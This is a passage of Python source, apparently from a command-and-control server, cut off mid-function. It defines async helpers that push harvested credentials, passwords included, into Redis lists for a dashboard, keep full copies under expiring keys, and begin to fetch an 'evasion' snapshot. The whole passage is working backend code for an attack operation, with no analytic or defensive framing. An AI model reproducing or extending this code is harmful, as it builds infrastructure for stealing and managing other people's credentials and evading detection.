async def get_credentials(limit: int = 50) -> List[dict]:
    """Fetch latest credentials from Redis list."""
    raw_list = await c2_server.redis.lrange("c2:credentials", 0, limit - 1)
    return [json.loads(r) for r in raw_list]


async def store_credential(cred: dict):
    """Push credential to Redis list (bounded, with TTL on sensitive data)."""
    # Store in list for dashboard display (trim passwords for memory safety)
    safe_cred = dict(cred)
    if "password" in safe_cred:
        safe_cred["password"] = (safe_cred["password"] or "")[:100]
    await c2_server.redis.lpush("c2:credentials", json.dumps(safe_cred))
    await c2_server.redis.ltrim("c2:credentials", 0, 199)
    # Full credential with TTL — auto-expires after 30 minutes
    full_key = f"c2:cred:full:{cred.get('id', 'unknown')}"
    await c2_server.redis.setex(full_key, 1800, json.dumps(cred))


async def get_evasion() -> dict:
    """Fetch latest evasion snapshot from Redis."""
